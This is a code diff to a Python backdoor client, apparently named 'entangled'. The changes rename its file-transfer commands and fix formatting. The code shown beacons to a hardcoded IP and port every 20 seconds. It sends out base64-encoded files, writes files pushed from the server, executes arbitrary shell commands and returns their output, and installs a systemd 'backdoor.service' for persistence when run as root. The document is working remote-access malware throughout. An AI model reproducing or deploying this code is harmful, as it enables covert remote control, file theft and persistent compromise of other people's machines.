@@ -6,17 +6,17 @@ import base64
 import time
 
 
-
 def connection():
     """Responsible for making connection to server. Will continue to connect every 20 seconds by default"""
     while True:
         time.sleep(20)
-	try:
-	    sock.connect(("192.168.159.133", 1526))
-	    shell()
-	except:
-	    connection()
-	    
+        try:
+            sock.connect(("192.168.159.133", 1526))
+            shell()
+        except:
+            connection()
+
+
 def send(data):
     """Responsible for sending data"""
     json_data = json.dumps(data)
@@ -41,12 +41,12 @@ def shell():
         if command == "":
             continue
 
-        elif command[:8] == "download":
-            with open(command[9:], "rb") as file:
+        elif command[:3] == "get":
+            with open(command[4:], "rb") as file:
                 send(base64.b64encode(file.read()))
 
-        elif command[:6] == "upload":
-            with open(command[7:], "wb") as uload:
+        elif command[:3] == "put":
+            with open(command[4:], "wb") as uload:
                 file_data = receive()
                 uload.write(base64.b64decode(file_data))
 
@@ -64,7 +64,7 @@ def shell():
                               "30\nExecStart=/usr/bin/python /home/<change me>/Downloads/entangled-master/client.py\n\n["
                               "Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service")
                     os.system("systemctl daemon-reload")
-                    #os.system("systemctl start backdoor")
+                    # os.system("systemctl start backdoor")
                 else:
                     print("I am not root")
             except AttributeError as a:
@@ -74,7 +74,7 @@ def shell():
         elif command[:2] == 'cd' and len(command) > 1:
             try:
                 os.chdir(command[3:])
-            except :
+            except:
                 continue
 
         else:
@@ -82,6 +82,7 @@ def shell():
                                     stdin=subprocess.PIPE)
             results = proc.stdout.read() + proc.stderr.read()
             send(results)
+
 
 if __name__ == "__main__":
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
